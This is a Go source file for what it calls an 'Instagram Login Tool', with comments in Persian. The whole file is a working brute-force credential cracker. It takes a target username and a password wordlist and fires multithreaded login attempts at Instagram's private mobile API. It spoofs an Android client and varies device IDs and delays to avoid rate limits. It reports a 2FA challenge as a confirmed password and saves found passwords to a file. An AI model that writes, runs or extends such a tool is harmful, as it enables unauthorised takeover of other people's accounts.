package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	API_URL       = "https://i.instagram.com/api/v1/"
	USER_AGENT    = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
	TIMEOUT       = 10 * time.Second
	CURRENT_TIME  = "2025-05-23 23:00:56"
	CURRENT_USER  = "monsmain"
	MAX_THREADS   = 3
	RESUME_FILE   = "resume.json"
)

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

type ResumeData struct {
	Username     string   `json:"username"`
	LastIndex    int      `json:"last_index"`
	TestedPwds   []string `json:"tested_passwords"`
	StartTime    string   `json:"start_time"`
}

type LoginSession struct {
	Username string
	mutex    sync.Mutex
	wg       sync.WaitGroup
	found    bool
	resume   ResumeData
}

func main() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
		defer logFile.Close()
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("User: %s\n\n", CURRENT_USER)

	var username string
	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&username)

	session := &LoginSession{
		Username: username,
		resume: ResumeData{
			Username:  username,
			StartTime: CURRENT_TIME,
		},
	}

	// بررسی وجود فایل resume
	if resumeData, exists := session.loadResumeData(); exists {
		fmt.Printf("\nFound resume data from previous session.\nLast tested password index: %d\n", resumeData.LastIndex)
		fmt.Print("Do you want to continue from last session? (y/n): ")
		var answer string
		fmt.Scanln(&answer)
		if strings.ToLower(answer) == "y" {
			session.resume = resumeData
		}
	}

	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt!")
		return
	}

	// حذف پسوردهای قبلاً تست شده
	if len(session.resume.TestedPwds) > 0 {
		passwords = filterTestedPasswords(passwords, session.resume.TestedPwds)
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
	fmt.Println("\nStarting login attempts...\n")

	// تقسیم پسوردها بین thread ها
	chunks := splitPasswords(passwords, MAX_THREADS)
	
	// شروع thread ها
	for i, chunk := range chunks {
		session.wg.Add(1)
		go session.testPasswordChunk(chunk, i+1)
	}

	// منتظر اتمام همه thread ها
	session.wg.Wait()

	if !session.found {
		fmt.Println("\n❌ No valid password found!")
		saveResult(username, "", false)
	}

	// پاک کردن فایل resume در صورت موفقیت
	if session.found {
		os.Remove(RESUME_FILE)
	}
}

func (s *LoginSession) testPasswordChunk(passwords []string, threadID int) {
	defer s.wg.Done()

	for _, password := range passwords {
		if s.found {
			return
		}

		s.mutex.Lock()
		fmt.Printf("[Thread-%d] Testing password: %s\n", threadID, maskPassword(password))
		s.mutex.Unlock()

		success, response := s.tryLogin(password)

		s.mutex.Lock()
		// اضافه کردن پسورد به لیست تست شده‌ها
		s.resume.TestedPwds = append(s.resume.TestedPwds, password)
		s.resume.LastIndex += 1
		s.saveResumeData()

		if success {
			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
			fmt.Printf("Username: %s\n", s.Username)
			if response.ErrorType == "challenge_required" {
				fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
			} else {
				fmt.Println("✅ Login successful!")
			}
			saveResult(s.Username, password, true)
			s.found = true
			s.mutex.Unlock()
			return
		} else {
			if response.ErrorType == "bad_password" {
				fmt.Println("❌ Invalid password")
			} else if response.ErrorType == "invalid_user" {
				fmt.Println("❌ Invalid username")
				s.found = true
				s.mutex.Unlock()
				return
			} else if response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
				fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
				fmt.Printf("Username: %s\n", s.Username)
				fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
				saveResult(s.Username, password, true)
				s.found = true
				s.mutex.Unlock()
				return
			} else {
				fmt.Printf("⚠️ Error: %s\n", response.Message)
			}
		}
		s.mutex.Unlock()

		time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
	}
}

func (s *LoginSession) tryLogin(password string) (bool, InstagramResponse) {
	loginUrl := API_URL + "accounts/login/"
	
	data := url.Values{}
	data.Set("username", s.Username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return false, InstagramResponse{}
	}

	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	client := &http.Client{Timeout: TIMEOUT}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return false, InstagramResponse{}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return false, InstagramResponse{}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return false, InstagramResponse{}
	}

	if response.ErrorType == "challenge_required" || 
	   response.Message == "challenge_required" {
		return true, response
	}

	success := response.Status == "ok" || 
		   strings.Contains(string(body), "logged_in_user")

	return success, response
}

func (s *LoginSession) saveResumeData() {
	data, err := json.MarshalIndent(s.resume, "", "    ")
	if err != nil {
		log.Printf("Error marshaling resume data: %v", err)
		return
	}

	err = ioutil.WriteFile(RESUME_FILE, data, 0644)
	if err != nil {
		log.Printf("Error saving resume data: %v", err)
	}
}

func (s *LoginSession) loadResumeData() (ResumeData, bool) {
	data, err := ioutil.ReadFile(RESUME_FILE)
	if err != nil {
		return ResumeData{}, false
	}

	var resumeData ResumeData
	if err := json.Unmarshal(data, &resumeData); err != nil {
		return ResumeData{}, false
	}

	return resumeData, true
}

func splitPasswords(passwords []string, n int) [][]string {
	var chunks [][]string
	chunkSize := (len(passwords) + n - 1) / n

	for i := 0; i < len(passwords); i += chunkSize {
		end := i + chunkSize
		if end > len(passwords) {
			end = len(passwords)
		}
		chunks = append(chunks, passwords[i:end])
	}

	return chunks
}

func filterTestedPasswords(passwords, tested []string) []string {
	testedMap := make(map[string]bool)
	for _, p := range tested {
		testedMap[p] = true
	}

	var filtered []string
	for _, p := range passwords {
		if !testedMap[p] {
			filtered = append(filtered, p)
		}
	}

	return filtered
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func saveResult(username, password string, success bool) {
	currentTime := CURRENT_TIME
	var status string
	if success {
		status = "✅ SUCCESS"
	} else {
		status = "❌ FAILED"
	}
	
	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n", 
		currentTime, status, username, password)
	
	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	file.WriteString(logEntry)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
